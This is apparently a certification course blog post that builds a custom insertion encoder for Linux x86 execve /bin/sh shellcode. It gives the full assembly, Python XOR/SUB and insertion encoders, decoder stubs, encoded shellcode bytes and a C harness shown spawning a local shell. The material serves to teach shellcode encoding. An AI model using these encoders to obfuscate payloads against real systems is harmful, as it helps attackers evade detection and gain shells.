# Assignment #4: Insertion Encoder

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-858


### Exercise
- Create a custom encoding scheme like the "Insertion Encoder" we showed you
- PoC with using execve-stack as the shellcode to encode with your schema and execute


### Solution

The custom scheme is compose by a execve-stack (/bin/sh) encoded with XOR and SUB, after I added the "Insertion Encoder" using insertion that consists in an incremental counter.

So, the *insertion decoder stub* must decode it using the counter.

First, I take a execve shellcode using the stack and encode it.

execve-stack (/bin/sh) without encoding:
```nasm
global _start			

section .text
_start:
	xor eax, eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	push eax
	mov edx, esp
	push ebx
	mov ecx, esp
	mov al, 11
	int 0x80

```

I encoded the execve-stack shellcode using XOR and SUB operators to encode the shellcode. 

#### Encoder execve-stack shellcode

```python
#!/usr/bin/python

shellcode = ("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""

for x in bytearray(shellcode) :
        y = x + 0x2
        c = y ^ 0xCA
        encoded += '\\x'
        encoded += '%02x' % c
        encoded2 += '0x'
        encoded2 += '%02x,' %c
        
print encoded
print encoded2
print 'Len: %d' % len(bytearray(shellcode))

```

I created the nasm program to decode it and generate the new shellcode:

#### Decoder execve-stack encoded shellcode

```nasm
global _start			

section .text
_start:

	jmp short call_decoder

decoder:
	pop esi
	xor ecx, ecx
	mov cl,25
decode:
	xor byte[esi], 0xca
	sub byte[esi], 0x2
	inc esi
	loop decode
	jmp short Shellcode

call_decoder:
	call decoder
	Shellcode: db 0xf9,0x08,0x98,0xa0,0xba,0xfb,0xbf,0xa0,0xa0,0xfb,0xfb,0xae,0xa1,0x41,0x2f,0x98,0x41,0x2e,0x9f,0x41,0x29,0x78,0xc7,0x05,0x48
```

Getting the new shellcode:
```bash
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment4$ ./compile.sh xor-sub-execve-stack
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment4$ objdump -d ./xor-sub-execve-stack|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\xeb\x10\x5e\x31\xc9\xb1\x19\x80\x36\xca\x80\x2e\x02\x46\xe2\xf7\xeb\x05\xe8\xeb\xff\xff\xff\xf9\x08\x98\xa0\xba\xfb\xbf\xa0\xa0\xfb\xfb\xae\xa1\x41\x2f\x98\x41\x2e\x9f\x41\x29\x78\xc7\x05\x48"

```

Check if the shellcode works well...


Finally, I added the *custom encoded schema*.


####Insertion encoder stub

```python
#!/usr/bin/python

encoded = ""
encoded2 = ""

shellcode = ("\xeb\x10\x5e\x31\xc9\xb1\x19\x80\x36\xca\x80\x2e\x02\x46\xe2\xf7\xeb\x05\xe8\xeb\xff\xff\xff\xf9\x08\x98\xa0\xba\xfb\xbf\xa0\xa0\xfb\xfb\xae\xa1\x41\x2f\x98\x41\x2e\x9f\x41\x29\x78\xc7\x05\x48")

print 'Encoded shellcode ...'

counter = 1
for x in bytearray(shellcode) :
        encoded += '\\x'
        encoded += '%02x' % x
        encoded += '\\x%02x' % counter

        encoded2 += '0x'
        encoded2 += '%02x,' %x
        encoded2 += '0x%02x,' % counter
        counter += 1


print encoded
print encoded2

print 'Len: %d' % len(bytearray(shellcode))

```

```bash
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment4$ ./Insertion-Encoder.py 
Encoded shellcode ...
\xeb\x01\x10\x02\x5e\x03\x31\x04\xc9\x05\xb1\x06\x19\x07\x80\x08\x36\x09\xca\x0a\x80\x0b\x2e\x0c\x02\x0d\x46\x0e\xe2\x0f\xf7\x10\xeb\x11\x05\x12\xe8\x13\xeb\x14\xff\x15\xff\x16\xff\x17\xf9\x18\x08\x19\x98\x1a\xa0\x1b\xba\x1c\xfb\x1d\xbf\x1e\xa0\x1f\xa0\x20\xfb\x21\xfb\x22\xae\x23\xa1\x24\x41\x25\x2f\x26\x98\x27\x41\x28\x2e\x29\x9f\x2a\x41\x2b\x29\x2c\x78\x2d\xc7\x2e\x05\x2f\x48\x30
0xeb,0x01,0x10,0x02,0x5e,0x03,0x31,0x04,0xc9,0x05,0xb1,0x06,0x19,0x07,0x80,0x08,0x36,0x09,0xca,0x0a,0x80,0x0b,0x2e,0x0c,0x02,0x0d,0x46,0x0e,0xe2,0x0f,0xf7,0x10,0xeb,0x11,0x05,0x12,0xe8,0x13,0xeb,0x14,0xff,0x15,0xff,0x16,0xff,0x17,0xf9,0x18,0x08,0x19,0x98,0x1a,0xa0,0x1b,0xba,0x1c,0xfb,0x1d,0xbf,0x1e,0xa0,0x1f,0xa0,0x20,0xfb,0x21,0xfb,0x22,0xae,0x23,0xa1,0x24,0x41,0x25,0x2f,0x26,0x98,0x27,0x41,0x28,0x2e,0x29,0x9f,0x2a,0x41,0x2b,0x29,0x2c,0x78,0x2d,0xc7,0x2e,0x05,0x2f,0x48,0x30,
Len: 48

```


####Insertion decoder stub:


```nasm
global _start			

section .text
_start:

	jmp short call_shellcode

decoder:
	pop esi
	lea edi, [esi +1]
	xor eax, eax
	mov al, 1
	xor ebx, ebx
	xor ecx, ecx
	mov cl, 1			;counter

decode: 
	mov bl, byte [esi + eax]
	xor bl, cl
	jnz short EncodedShellcode
	mov bl, byte [esi + eax + 1]
	mov byte [edi], bl
	inc edi
	add al, 2
	add cl, 1
	jmp short decode	



call_shellcode:

	call decoder
	EncodedShellcode: db 0xeb,0x01,0x10,0x02,0x5e,0x03,0x31,0x04,0xc9,0x05,0xb1,0x06,0x19,0x07,0x80,0x08,0x36,0x09,0xca,0x0a,0x80,0x0b,0x2e,0x0c,0x02,0x0d,0x46,0x0e,0xe2,0x0f,0xf7,0x10,0xeb,0x11,0x05,0x12,0xe8,0x13,0xeb,0x14,0xff,0x15,0xff,0x16,0xff,0x17,0xf9,0x18,0x08,0x19,0x98,0x1a,0xa0,0x1b,0xba,0x1c,0xfb,0x1d,0xbf,0x1e,0xa0,0x1f,0xa0,0x20,0xfb,0x21,0xfb,0x22,0xae,0x23,0xa1,0x24,0x41,0x25,0x2f,0x26,0x98,0x27,0x41,0x28,0x2e,0x29,0x9f,0x2a,0x41,0x2b,0x29,0x2c,0x78,0x2d,0xc7,0x2e,0x05,0x2f,0x48,0x30

```

```bash
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment4$ objdump -d ./insertion-decoder|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\xeb\x23\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x31\xc9\xb1\x01\x8a\x1c\x06\x30\xcb\x75\x13\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\x80\xc1\x01\xeb\xeb\xe8\xd8\xff\xff\xff\xeb\x01\x10\x02\x5e\x03\x31\x04\xc9\x05\xb1\x06\x19\x07\x80\x08\x36\x09\xca\x0a\x80\x0b\x2e\x0c\x02\x0d\x46\x0e\xe2\x0f\xf7\x10\xeb\x11\x05\x12\xe8\x13\xeb\x14\xff\x15\xff\x16\xff\x17\xf9\x18\x08\x19\x98\x1a\xa0\x1b\xba\x1c\xfb\x1d\xbf\x1e\xa0\x1f\xa0\x20\xfb\x21\xfb\x22\xae\x23\xa1\x24\x41\x25\x2f\x26\x98\x27\x41\x28\x2e\x29\x9f\x2a\x41\x2b\x29\x2c\x78\x2d\xc7\x2e\x05\x2f\x48\x30"
```

And we check that the shellcode works well... 

#### Proof of Concept (PoC)

```bash
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment4$ cat shellcode.c 
#include<stdio.h>
#include<string.h>

unsigned char code[] = 
"\xeb\x23\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x31\xc9\xb1\x01\x8a\x1c\x06\x30\xcb\x75\x13\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\x80\xc1\x01\xeb\xeb\xe8\xd8\xff\xff\xff\xeb\x01\x10\x02\x5e\x03\x31\x04\xc9\x05\xb1\x06\x19\x07\x80\x08\x36\x09\xca\x0a\x80\x0b\x2e\x0c\x02\x0d\x46\x0e\xe2\x0f\xf7\x10\xeb\x11\x05\x12\xe8\x13\xeb\x14\xff\x15\xff\x16\xff\x17\xf9\x18\x08\x19\x98\x1a\xa0\x1b\xba\x1c\xfb\x1d\xbf\x1e\xa0\x1f\xa0\x20\xfb\x21\xfb\x22\xae\x23\xa1\x24\x41\x25\x2f\x26\x98\x27\x41\x28\x2e\x29\x9f\x2a\x41\x2b\x29\x2c\x78\x2d\xc7\x2e\x05\x2f\x48\x30";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment4$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/GitHub/SLAE/Assignment4$ ./shellcode 
Shellcode Length:  138
$ id
uid=1000(hiro) gid=1000(hiro) groups=1000(hiro),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner)
$ 

```
